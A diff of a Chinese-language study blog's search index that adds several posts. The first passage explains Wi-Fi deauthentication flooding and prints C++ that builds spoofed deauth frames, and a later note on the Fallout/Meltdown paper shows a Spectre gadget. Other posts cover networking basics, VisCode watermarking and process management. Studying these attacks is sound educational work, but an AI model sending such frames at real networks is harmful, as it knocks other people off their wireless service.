+<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/8.png" class="">
+
+<p>准确的说，我们需要向设备发送取消验证包。地址1应该是DA（设备mac），地址2是BSSID（伪造成APmac），地址3源地址（还是APmac）</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#attack.cpp</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Attack::deauthDevice</span><span class="params">(<span class="keyword">uint8_t</span>* apMac, <span class="keyword">uint8_t</span>* stMac, <span class="keyword">uint8_t</span> reason, <span class="keyword">uint8_t</span> ch)</span> </span>&#123;</span><br><span class="line">	······</span><br><span class="line">    <span class="comment">// build deauth packet</span></span><br><span class="line">    packetSize = <span class="keyword">sizeof</span>(deauthPacket);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span> deauthpkt[packetSize];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(deauthpkt, deauthPacket, packetSize);<span class="comment">//构造mac帧头，初始数据见下</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;deauthpkt[<span class="number">4</span>], stMac, <span class="number">6</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;deauthpkt[<span class="number">10</span>], apMac, <span class="number">6</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;deauthpkt[<span class="number">16</span>], apMac, <span class="number">6</span>);</span><br><span class="line">    deauthpkt[<span class="number">24</span>] = reason;</span><br><span class="line">    ······</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#attack.h</span></span><br><span class="line"><span class="keyword">uint8_t</span> deauthPacket[<span class="number">26</span>] = &#123;</span><br><span class="line">            <span class="comment">/*  0 - 1  */</span> <span class="number">0xC0</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="comment">/*  2 - 3  */</span> <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">            <span class="comment">/*  4 - 9  */</span> <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>,</span><br><span class="line">            <span class="comment">/* 10 - 15 */</span> <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>,</span><br><span class="line">            <span class="comment">/* 16 - 21 */</span> <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>,</span><br><span class="line">            <span class="comment">/* 22 - 23 */</span> <span class="number">0x00</span>, <span class="number">0x00</span>,                         </span><br><span class="line">            <span class="comment">/* 24 - 25 */</span> <span class="number">0x01</span>, <span class="number">0x00</span>                         </span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>软件安全</category>
       </categories>
   </entry>
   <entry>
@@ -2459,6 +2439,203 @@
       </categories>
   </entry>
   <entry>
+    <title>Fallout: Leaking Data on Meltdown-resistant CPUs论文笔记</title>
+    <url>/2021/12/09/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9AFallout-Leaking-Data-on-Meltdown-resistant-CPUs/</url>
+    <content><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h2><p>​        为了提高从内存里读取数据的速度，我们设立了多级缓存。缓存速度比内存要快很多，可以用来存储一些经常用到的数据，这样可以调高数据的利用效率。</p>
+<p>​        CPU会认为当前访问的某个地址的数据时，它周围的数据随后也会大概率被访问到，所以周围数据会一并放到缓存中，以便于取用。</p>
+<h2 id="乱序执行"><a href="#乱序执行" class="headerlink" title="乱序执行"></a>乱序执行</h2><p>​        某些指令的准备工作，和一些不依赖前面指令运行结果的指令，都可以提前运行，然后把结果放入缓存。如果轮到该指令运行，就直接将缓存内数据写入内存。</p>
+<h2 id="分支预测"><a href="#分支预测" class="headerlink" title="分支预测"></a>分支预测</h2><p>​        遇到分支跳转时，按照之前的经验，如果某个分支经常被执行，那后续再去这个分支的概率一定很大，那这样咱们预测后面会去到这个分支，就提前把这个分支后面指令能做的工作先做了。</p>
+<h2 id="幽灵与熔断"><a href="#幽灵与熔断" class="headerlink" title="幽灵与熔断"></a>幽灵与熔断</h2><p>​        如果分支预测被恶意利用，收到恶意程序欺骗，那么就会在关键时候预测失败，从而执行一些本不该执行的指令。虽然只将数据存储在缓存中，但通过访问内存时间的不同（放入缓存的数据访问时间会明显较短），就可以知道哪一块地址被缓存了。    </p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (x &lt; array1_size)</span><br><span class="line">&#123;</span><br><span class="line">   temp &amp;= array2[array1[x] * <span class="number">512</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>一开始的x都小于array1_size，欺骗CPU不断提前进行分支预测。但当真正的恶意x（某个地址单元）（大于array1_size）到来时，CPU还是把if里面的执行结果放入了缓存。只是在指令真正开始执行时，虽然缓存不被输出，但访问的时间会明显较短，数一下缓存的内存到数组开头的偏移距离，可以推出这个地址单元的值。</p>
+<h2 id="缓解机制"><a href="#缓解机制" class="headerlink" title="缓解机制"></a>缓解机制</h2><p>Meltdown攻击最有效的方式就是KAISER/KPTI。KAISER/KPTI方案中要求操作系统维护两个页表，一个页表给用户程序使用，一个给kernel自己使用。并且确保程序所使用的页表不会映射高优先级的页面，即不会映射kernel的页面。</p>
+<p>两个页表的切换，会导致CR3（控制寄存器：用于控制和确定处理器的操作模式以及当前执行任务的特性）的重新加载，从而引起TLB刷新，进而降低内存的访问速度。如果某些应用场景需要大量的内核和用户空间切换（两个页表之间的切换），会造成较高的性能开销。</p>
+<h1 id="最新的漏洞"><a href="#最新的漏洞" class="headerlink" title="最新的漏洞"></a>最新的漏洞</h1><p>​        硬件修复后，上述缓解机制被禁用，该文章说明了最新的抗熔断处理器仍是具有数据泄漏的潜在风险，仍易受到熔断攻击。</p>
+<p>​        待更新</p>
+]]></content>
+      <tags>
+        <tag>幽灵与熔断</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>计算机网络绪论</title>
+    <url>/2021/04/01/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%BB%AA%E8%AE%BA/</url>
+    <content><![CDATA[<h2 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h2><h3 id="1-1-1-概念、组成、功能和分类"><a href="#1-1-1-概念、组成、功能和分类" class="headerlink" title="1.1.1 概念、组成、功能和分类"></a>1.1.1 概念、组成、功能和分类</h3><h4 id="计算机网络的概念："><a href="#计算机网络的概念：" class="headerlink" title="计算机网络的概念："></a>计算机网络的概念：</h4><p>​    计算机网络：是一个将分散的、具有独立功能的计算机系统。通过通信设备与线路连接起来，由功能完善的软件实现资源共享和信息传递的系统。</p>
+<p>​    计算机网络是<strong>互联的、自治的</strong>计算机集合。</p>
+<p>​        互联-互联互通 通信链路</p>
+<p>​        自治-无主从关系</p>
+<span id="more"></span>
+
+<h4 id="计算机网络的功能："><a href="#计算机网络的功能：" class="headerlink" title="计算机网络的功能："></a>计算机网络的功能：</h4><p>​    1数据通信（连通性）</p>
+<p>​    2资源共享    </p>
+<p>​         硬件    软件    数据</p>
+<p>​    3分布式处理    多台计算机各自承担同一工作任务的不同部分</p>
+<p>​    4提高可靠性(替代机)</p>
+<p>​    5负载均衡    各计算机之间更亲密</p>
+<h4 id="计算机网络的组成："><a href="#计算机网络的组成：" class="headerlink" title="计算机网络的组成："></a>计算机网络的组成：</h4><p>​    1组成部分：硬件、软件、协议</p>
+<p>​    2工作方式:</p>
+<p>​        边缘部分    用户直接使用（C/S方式；P2P方式）</p>
+<p>​        核心部分    为边缘部分服务</p>
+<p>​    3功能组成：</p>
+<img src="/2021/04/01/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%BB%AA%E8%AE%BA/1.png" class="">
+
+<h6 id="资源子网-实现资源共享-数据处理"><a href="#资源子网-实现资源共享-数据处理" class="headerlink" title="资源子网    实现资源共享/数据处理"></a>资源子网    实现资源共享/数据处理</h6><p>​                实现资源共享功能的设备和软件的集合</p>
+<h6 id="通信子网-实现数据通信"><a href="#通信子网-实现数据通信" class="headerlink" title="通信子网    实现数据通信"></a>通信子网    实现数据通信</h6><p>​                各种传输介质、通讯设备、相应的网络协议组成</p>
+<h4 id="计算机网络的分类："><a href="#计算机网络的分类：" class="headerlink" title="计算机网络的分类："></a>计算机网络的分类：</h4><h6 id="1按分布范围分："><a href="#1按分布范围分：" class="headerlink" title="1按分布范围分："></a>1按分布范围分：</h6><p>​    广域网WAN    城域网MAN    局域网WAN    个人区域网PAN</p>
+<h6 id="2按使用者分："><a href="#2按使用者分：" class="headerlink" title="2按使用者分："></a>2按使用者分：</h6><p>​    公用网    专用网</p>
+<h6 id="3按交换技术分："><a href="#3按交换技术分：" class="headerlink" title="3按交换技术分："></a>3按交换技术分：</h6><p>​    电路交换    报文交换    分组交换</p>
+<h6 id="4按拓扑结构分："><a href="#4按拓扑结构分：" class="headerlink" title="4按拓扑结构分："></a>4按拓扑结构分：</h6><p>​    总线型    星型    环型    网状型</p>
+<h6 id="5按传输技术分："><a href="#5按传输技术分：" class="headerlink" title="5按传输技术分："></a>5按传输技术分：</h6><p>​    广播式网络（共享公共通信信道）</p>
+<p>​    点对点网络（使用分组存储转发和路由选择机制）</p>
+<h3 id="1-1-2-标准化工作及相关知识"><a href="#1-1-2-标准化工作及相关知识" class="headerlink" title="1.1.2 标准化工作及相关知识"></a>1.1.2 标准化工作及相关知识</h3><h4 id="标准换工作"><a href="#标准换工作" class="headerlink" title="标准换工作"></a>标准换工作</h4><h5 id="标准的分类："><a href="#标准的分类：" class="headerlink" title="标准的分类："></a>标准的分类：</h5><p>​        法定标准    由权威机构制定的正式的、合法的标准</p>
+<p>​        事实标准    某些公司的产品在竞争中占据了主流，时间长了，这些产品的协议和技术就成了标准</p>
+<h5 id="标准化工作："><a href="#标准化工作：" class="headerlink" title="标准化工作："></a>标准化工作：</h5><p>​        <strong>RFC</strong>    因特网标准的形式</p>
+<p>​        RFC要上升为因特网正式标准的<strong>四个阶段</strong>：</p>
+<p>​            1）因特网草案    这个阶段还不是RFC文档</p>
+<p>​            2）建议标准        这个阶段开始成为RFC文档</p>
+<p>​            3）草案标准        IETF、IAB认证</p>
+<p>​            4）因特网标准</p>
+<h4 id="标准化工作的相关组织"><a href="#标准化工作的相关组织" class="headerlink" title="标准化工作的相关组织"></a>标准化工作的相关组织</h4><p>​    国际标准化组织ISO</p>
+<p>​    国际电信联盟ITU</p>
+<p>​    国际电气电子工程师协会IEEE</p>
+<p>​    Internet工程任务组IETE</p>
+<h3 id="1-1-3-速率相关的性能指标"><a href="#1-1-3-速率相关的性能指标" class="headerlink" title="1.1.3 速率相关的性能指标"></a>1.1.3 速率相关的性能指标</h3><h4 id="速率"><a href="#速率" class="headerlink" title="速率"></a>速率</h4><p>​    速率即数据率或称数据传输率或比特率。</p>
+<p>​    比特    1/0    位</p>
+<p>​    连接在计算机网络上的主机在数字信道上传送熟虑位数的速率。</p>
+<p>​    单位b/s，kb/s，Mb/s，Gb/s，Tb/s</p>
+<img src="/2021/04/01/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%BB%AA%E8%AE%BA/2.png" class="">
+
+<h4 id="带宽"><a href="#带宽" class="headerlink" title="带宽"></a>带宽</h4><p>​    ”带宽”原本指某个信号具有的<strong>频带宽度</strong>，即最高频率与最低速率之差，单位是赫兹（HZ）。</p>
+<p>​    计算机网络中，带宽用来表示网络的通讯线路传送数据的能力，通常是单位时间从网络的某一点到另一点所能通过的“<strong>最高数据率</strong>”。单位是“比特每秒”。网络设备所支持的最高速度。</p>
+<h4 id="吞吐量"><a href="#吞吐量" class="headerlink" title="吞吐量"></a>吞吐量</h4><p>​    表示<strong>单位时间</strong>内通过<strong>某个网络（或信道、接口）</strong>的数据量。单位是比特每秒。    </p>
+<p>​    吞吐量受网络的带宽或网络的额定速率的限制。</p>
+<h3 id="1-1-4-时延、时延带宽积、RTT和利用率"><a href="#1-1-4-时延、时延带宽积、RTT和利用率" class="headerlink" title="1.1.4 时延、时延带宽积、RTT和利用率"></a>1.1.4 时延、时延带宽积、RTT和利用率</h3><h4 id="时延"><a href="#时延" class="headerlink" title="时延"></a>时延</h4><p>​    指数据从<strong>网络（或链路）</strong>的一段传送到另一端所需的时间。也叫<strong>延迟</strong>或<strong>迟延</strong>。单位是s。</p>
+<img src="/2021/04/01/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%BB%AA%E8%AE%BA/3.png" class="">
+
+<h4 id="时延带宽积"><a href="#时延带宽积" class="headerlink" title="时延带宽积"></a>时延带宽积</h4><p>​    时延带宽积=<strong>传播时延</strong>X<strong>带宽</strong></p>
+<p>​    又称为以比特为单位的链路长度</p>
+<h4 id="往返时延RTT"><a href="#往返时延RTT" class="headerlink" title="往返时延RTT"></a>往返时延RTT</h4><p>​    从发送方发送数据开始，到发送方收到接受方的确认，总共经历的时延。</p>
+<p>​    RTT越大，在收到确认之前，可以发送的数据越多。</p>
+<p>​    <img src="/2021/04/01/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%BB%AA%E8%AE%BA/4.png" class=""></p>
+<h4 id="利用率"><a href="#利用率" class="headerlink" title="利用率"></a>利用率</h4><p>​    利用率分为信道利用率和网络利用率。</p>
+<h5 id="1-信道利用率"><a href="#1-信道利用率" class="headerlink" title="1.信道利用率"></a>1.信道利用率</h5><p>​            =有数据通过时间/（有+无）数据通过时间</p>
+<h5 id="2-网络利用率"><a href="#2-网络利用率" class="headerlink" title="2.网络利用率"></a>2.网络利用率</h5><p>​            =信道利用率加权平均值</p>
+<h4 id="1-2-1-分层结构、协议、接口、服务"><a href="#1-2-1-分层结构、协议、接口、服务" class="headerlink" title="1.2.1 分层结构、协议、接口、服务"></a>1.2.1 分层结构、协议、接口、服务</h4><h5 id="为什么要分层？"><a href="#为什么要分层？" class="headerlink" title="为什么要分层？"></a>为什么要分层？</h5><p>​        发送前要完成的工作：</p>
+<p>​            （1）发起通信的计算机必须将数据通信的通路进行激活。</p>
+<p>​            （2）要告诉网络如何识别目的主机。</p>
+<p>​            （3）发起通信的计算机要查明目的主机是否开机，并且与网络连接正常。</p>
+<p>​            （4）发起通信的计算机要弄清楚，对方计算机中文件管理程序是否已经做好准备工作。</p>
+<p>​            （5）确保差错和意外可以解决</p>
+<h5 id="怎么分层？"><a href="#怎么分层？" class="headerlink" title="怎么分层？"></a>怎么分层？</h5><h6 id="分层的基本原则："><a href="#分层的基本原则：" class="headerlink" title="分层的基本原则："></a>分层的<strong>基本原则</strong>：</h6><p>​        1.各层直接相互独立，每层只实现一种相对独立的功能</p>
+<p>​        2.各层之间界面自然清晰，易于理解，相互交流可能少</p>
+<p>​        3.结构上可分隔开。各层都采用最合适的技术实现</p>
+<p>​        4.保持下层对上层的独立性，上层单向使用下层提供的服务</p>
+<p>​        5.整个分层结构应该促进标准化工作</p>
+<h5 id="正式认识分层结构"><a href="#正式认识分层结构" class="headerlink" title="正式认识分层结构:"></a>正式认识分层结构:</h5><p>​        1.实体：第n层中的活动元素称为n层实体。同一层的实体叫对等实体。</p>
+<p>​        2.协议：为进行网络中的对等实体数据交换而建立的规则、标准或约定成为网络协议。</p>
+<p>​            <img src="/2021/04/01/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%BB%AA%E8%AE%BA/5.png" class=""></p>
+<p>​        3.接口（访问服务点SAP）：上层使用下层的服务。</p>
+<p>​        4.服务：下层为相邻上层提供的功能调用。【垂直】</p>
+<h5 id="概念总结"><a href="#概念总结" class="headerlink" title="概念总结:"></a>概念总结:</h5><p>​        网络体系结构是从功能上描述计算机网络结构。</p>
+<p>​        计算机网络体系结构简称网络体系结构是分层结构。</p>
+<p>​        每层遵守某个/些网络协议以完成本层功能。</p>
+<p>​        计算机网络体系结构是计算机网路的各层及其协议的集合。</p>
+<p>​        第n层在向n+1层提供服务时，此服务不仅包含第n层本身的功能，还包含由下层服务提供的功能。</p>
+<p>​        仅仅在在相邻层间有接口，且所提供服务的具体实现细节对上一层完全屏蔽。</p>
+<p>​        体系结构是抽象的，而实现是指能运行的一些软件和硬件。</p>
+<h4 id="1-2-2-OSI参考模型"><a href="#1-2-2-OSI参考模型" class="headerlink" title="1.2.2 OSI参考模型"></a>1.2.2 OSI参考模型</h4><p>​    <img src="C:\Users\86189\blog\source\_posts\6.png" style="zoom:50%;" /></p>
+<h5 id="ISO-OSI参考模型–怎么来的？"><a href="#ISO-OSI参考模型–怎么来的？" class="headerlink" title="ISO/OSI参考模型–怎么来的？"></a>ISO/OSI参考模型–怎么来的？</h5><p>​        为了解决计算机网络复杂的大问题=》分层结构（按功能）</p>
+<p>​        目的：支持异构网络系统的互联互通。</p>
+<p>​        国际标准化组织（ISO）于1984年提出开放系统互连（OSI）参考模型。</p>
+<img src="/2021/04/01/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%BB%AA%E8%AE%BA/7.png" class="">
+
+<h5 id="ISO-OSI参考模型"><a href="#ISO-OSI参考模型" class="headerlink" title="ISO/OSI参考模型"></a>ISO/OSI参考模型</h5><img src="/2021/04/01/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%BB%AA%E8%AE%BA/8.png" class="">
+
+<h4 id="1-2-3-OSI参考模型（2）"><a href="#1-2-3-OSI参考模型（2）" class="headerlink" title="1.2.3 OSI参考模型（2）"></a><img src="/2021/04/01/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%BB%AA%E8%AE%BA/9.png" class="">1.2.3 OSI参考模型（2）</h4><h5 id="应用层："><a href="#应用层：" class="headerlink" title="应用层："></a>应用层：</h5><p>​            所有能和用户产生网络流量的程序</p>
+<p>​            典型应用层服务：</p>
+<p>​                文件传输（FTP）</p>
+<p>​                电子邮件（SMTP）</p>
+<p>​                万维网（HTTP）</p>
+<p>​                ······</p>
+<h5 id="表示层："><a href="#表示层：" class="headerlink" title="表示层："></a>表示层：</h5><p>​            用于处理两个通信系统中变换消息的表示方式（语法和语义）</p>
+<p>​                功能一：数据格式变换</p>
+<p>​                功能二：数据加密解密</p>
+<p>​                功能三：数据压缩和恢复</p>
+<p>​            主要协议：JPEG，ASCII</p>
+<h5 id="会话层："><a href="#会话层：" class="headerlink" title="会话层："></a>会话层：</h5><p>​            向表示层实体/用户进程提供建立连接并在连接上有序地传输数据。</p>
+<p>​                这是会话，也是<strong>建立同步</strong>（SYN）</p>
+<p>​            功能一：建立、管理、终止会话</p>
+<p>​            功能二：使用校验点可使会话在通信失效时从校验点/同步点继续回复通信，实现数据同步。</p>
+<h5 id="传输层："><a href="#传输层：" class="headerlink" title="传输层："></a>传输层：</h5><p>​            负责主机中两个进程的通信，即端到端的通信。传输单位是<strong>报文段</strong>或<strong>用户数据报</strong>。</p>
+<p>​                功能一：可靠传输、不可靠传输</p>
+<p>​                功能二：差错控制</p>
+<p>​                功能三：流量控制</p>
+<p>​                功能四：复用分用</p>
+<p>​                                <strong>复用</strong>：多个应用层进程可同时使用下面运输层的服务。</p>
+<p>​                                <strong>分用</strong>：运输层把收到的信息分别交付到上面应用层中相应的进程。</p>
+<p>​            </p>
+<h5 id="网络层："><a href="#网络层：" class="headerlink" title="网络层："></a>网络层：</h5><p>​            主要任务是把分组从源端传到目的端，为分组交换网上的不同主机提供通信服务。网络层传输单位是<strong>数据报</strong>。</p>
+<p>​                功能一：路由选择    为了找到数据传输和的<strong>最佳路径</strong></p>
+<p>​                功能二：流量控制</p>
+<p>​                功能三：差错控制</p>
+<p>​                功能四：拥塞控制</p>
+<h5 id="数据链路层："><a href="#数据链路层：" class="headerlink" title="数据链路层："></a>数据链路层：</h5><p>​            主要任务是把网络层传下来的数据报组装成<strong>帧</strong>。数据链路层的传输单位是<strong>帧</strong>。</p>
+<p>​                功能一：成帧（<strong>定义帧的开始和结束</strong>）</p>
+<p>​                功能二：差错控制 <strong>帧错+位错</strong></p>
+<p>​                功能三：流量控制</p>
+<p>​                功能四：访问（接入）控制 <strong>控制对信道的访问</strong></p>
+<h5 id="物理层："><a href="#物理层：" class="headerlink" title="物理层："></a>物理层：</h5><p>​            主要任务是在物理媒体上实现比特流的<strong>透明传输</strong>。物理层传输单位是<strong>比特</strong>。</p>
+<p>​            物理层传输单位是比特。</p>
+<p>​                功能一：定义接口特性</p>
+<p>​                功能二：定义传输模式     <strong>单工</strong>、<strong>半双工</strong>、<strong>双工</strong></p>
+<p>​                功能三：定义传输速率</p>
+<p>​                功能四：比特同步</p>
+<p>​                功能五：比特编码</p>
+<h4 id="1-2-4-TCP、IP参考模型和5层参考模型"><a href="#1-2-4-TCP、IP参考模型和5层参考模型" class="headerlink" title="1.2.4 TCP、IP参考模型和5层参考模型"></a>1.2.4 TCP、IP参考模型和5层参考模型</h4><h5 id="OSI参考模型与TCP-IP参考模型"><a href="#OSI参考模型与TCP-IP参考模型" class="headerlink" title="OSI参考模型与TCP/IP参考模型"></a>OSI参考模型与TCP/IP参考模型</h5><img src="/2021/04/01/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%BB%AA%E8%AE%BA/10.png" class="">
+
+<h6 id="OSI参考模型与TCP-IP参考模型的相同点"><a href="#OSI参考模型与TCP-IP参考模型的相同点" class="headerlink" title="OSI参考模型与TCP/IP参考模型的相同点"></a>OSI参考模型与TCP/IP参考模型的相同点</h6><p>​            1.都分层</p>
+<p>​            2.基于独立的协议栈的概念</p>
+<p>​            3可以实现异构网络互联</p>
+<h6 id="OSI参考模型与TCP-IP参考模型的不同点"><a href="#OSI参考模型与TCP-IP参考模型的不同点" class="headerlink" title="OSI参考模型与TCP/IP参考模型的不同点"></a>OSI参考模型与TCP/IP参考模型的不同点</h6><p>​            1.OSI定义三点：<strong>服务、协议、接口</strong></p>
+<p>​            2.OSI先出现，参考模型先于协议发明，不偏向特定协议</p>
+<p>​            3.TCP/IP设计之初就考虑到互联网异构问题，将IP作为重要层次</p>
+<p>​        <img src="/2021/04/01/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%BB%AA%E8%AE%BA/11.png" class=""></p>
+<p>​            <strong>面向连接</strong>：第一是建立连接，发出一个建立连接的请求。第二阶段开始传输数据。最后传输完毕，必须释放连接。</p>
+<p>​            <strong>无连接</strong>：直接进行数据传输。</p>
+<h5 id="五层参考模型"><a href="#五层参考模型" class="headerlink" title="五层参考模型"></a>五层参考模型</h5><h5 id=""><a href="#" class="headerlink" title=""></a><img src="/2021/04/01/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%BB%AA%E8%AE%BA/12.png" class=""></h5><h4 id="5层参考模型的数据封装与解封装"><a href="#5层参考模型的数据封装与解封装" class="headerlink" title="5层参考模型的数据封装与解封装"></a>5层参考模型的数据封装与解封装</h4><img src="/2021/04/01/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%BB%AA%E8%AE%BA/13.png" class="">
+]]></content>
+      <categories>
+        <category>计算机网络</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>VisCode: Embedding Information in Visualization Images using</title>
+    <url>/2021/12/09/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9AVisCode-Embedding-Information-in-Visualization-Images-using/</url>
+    <content><![CDATA[<h1 id="VisCode-使用编码器-解码器网络在可视化图像中嵌入信息"><a href="#VisCode-使用编码器-解码器网络在可视化图像中嵌入信息" class="headerlink" title="VisCode:使用编码器-解码器网络在可视化图像中嵌入信息"></a>VisCode:使用编码器-解码器网络在可视化图像中嵌入信息</h1><h2 id="Overiew"><a href="#Overiew" class="headerlink" title="Overiew"></a>Overiew</h2><p>​        数据可视化的一个基本目标是提高对数据的认知和感知能力。与传输大量的原始数据相比，图像是更能被接受的载体。但是，在将原始信息转化为像素值后，很难从得到的图像中重建原始信息。而VisCode，就是一个在可视化图像中使用编码器和解码器网络嵌入和恢复隐藏信息的框架。</p>
+<h2 id="三个组件（Visual-Importance-Network、Encoder-Network、Decoder-Network）"><a href="#三个组件（Visual-Importance-Network、Encoder-Network、Decoder-Network）" class="headerlink" title="三个组件（Visual Importance Network、Encoder Network、Decoder Network）"></a>三个组件（Visual Importance Network、Encoder Network、Decoder Network）</h2><h3 id="Visual-Importance-Network"><a href="#Visual-Importance-Network" class="headerlink" title="Visual Importance Network"></a>Visual Importance Network</h3><p>​        由于数据可视化的语义特征与自然图像有很大的不同，我们使用网络来建模，得到一个<strong>视觉重要性图</strong>来用于下一个组件(Encode Network)的约束。虑到错误校正，我们将普通信息转换为嵌入一系列<strong>QR码</strong>，而不是二进制数据。</p>
+<p>​        <img src="/2021/12/09/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9AVisCode-Embedding-Information-in-Visualization-Images-using/1.png" class=""></p>
+<h3 id="Encoder-Network"><a href="#Encoder-Network" class="headerlink" title="Encoder Network"></a>Encoder Network</h3><p>​        在该网络组件中，通过特征提取过程将<strong>载体图像和二维码图像</strong>嵌入到向量中。</p>
+<img src="/2021/12/09/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9AVisCode-Embedding-Information-in-Visualization-Images-using/2.png" class="">、
+
+<h3 id="Decoder-Network"><a href="#Decoder-Network" class="headerlink" title="Decoder Network"></a>Decoder Network</h3><p>​        解码器网络从编码的图像中检索信息。用户可以通过数字传输与他人共享编码图像。将编码后的图像解码后，从解码后的QR码图像中获得最终的信息，并进行纠错。</p>
+<img src="/2021/12/09/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9AVisCode-Embedding-Information-in-Visualization-Images-using/3.png" class="">
+
+<h2 id="VisCode系统运行过程"><a href="#VisCode系统运行过程" class="headerlink" title="VisCode系统运行过程"></a>VisCode系统运行过程</h2><p>​        VisCode系统的主要组件。首先，视觉重要性网络(b)对输入图形图(a)进行处理，便于检测可视化的显著特征，输出<strong>视觉重要性图</strong>。接下来，编码器网络(c)将<strong>秘密信息</strong>嵌入到图形图(a)中，通过特征提取将<strong>载体图像和二维码图像</strong>嵌入到向量中。然后，将这两个向量连接起来(如黄色矩形所示)，并进入<strong>自编码阶段</strong>。编码后的图像(d)被发送给用户(e)，用户可以通过数字传输将其发送给其他人。当用户希望获取图表中隐藏的详细信息时，可以将编码后的图像上传到解码器网络(f)。经过数据恢复和纠错后，用户接收到解码后的信息(g)。</p>
+<img src="/2021/12/09/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9AVisCode-Embedding-Information-in-Visualization-Images-using/4.png" class="">
+
+<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><h3 id="视觉重要性地图Visual-Importance-Map"><a href="#视觉重要性地图Visual-Importance-Map" class="headerlink" title="视觉重要性地图Visual Importance Map"></a>视觉重要性地图Visual Importance Map</h3><p>​        编码器网络的目标是将大量信息嵌入到图形图表中，同时使编码的图像在感知上与原始图像相同。一个简单的解决办法是训练一个模型使原始图表和编码后的图表之间像素差的平均平方误差最小。</p>
+<p>​        视觉重要性图为图像的不同区域分配不同的分数（将信息嵌入到分数高的区域），这有助于在编码阶段保持重要内容的视觉质量。</p>
+<h3 id="如何得到一个数据集？"><a href="#如何得到一个数据集？" class="headerlink" title="如何得到一个数据集？"></a>如何得到一个数据集？</h3><p>​        Bylinskii等人的启发，我们利用基于带有<strong>眼动注释</strong>（<strong>人看一张图是眼球的聚焦点</strong>）的MASSVIS数据集建立了一个预测模型。</p>
+<p>​        因此，为了获得更准确的高层次语义上下文信息和更低层次的细节信息，我们使用混合训练，又人工对每个像素点进行注释，标注了其重要性。</p>
+<p>​        在上述两种预测模型的混合训练下，我们得到结果：</p>
+<img src="/2021/12/09/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9AVisCode-Embedding-Information-in-Visualization-Images-using/5.png" class="">a是输入的两个图像，b是用Bylinskii预测模型建的结果，c是人工注释后的结果，d是我们混合两种模型得到的重要性地图。
+]]></content>
+      <categories>
+        <category>数据驱动的数字水印</category>
+      </categories>
+  </entry>
+  <entry>
     <title>进程管理</title>
     <url>/2021/09/05/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/</url>
     <content><![CDATA[<h2 id="CPU管理的直观想法"><a href="#CPU管理的直观想法" class="headerlink" title="CPU管理的直观想法"></a>CPU管理的直观想法</h2><h3 id="管理CPU，先使用CPU"><a href="#管理CPU，先使用CPU" class="headerlink" title="管理CPU，先使用CPU"></a>管理CPU，先使用CPU</h3><ul>
@@ -3064,157 +3241,6 @@ end:    for(i=0;i&lt;n;i++)
 ]]></content>
       <categories>
         <category>操作系统</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>计算机网络绪论</title>
-    <url>/2021/04/01/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%BB%AA%E8%AE%BA/</url>
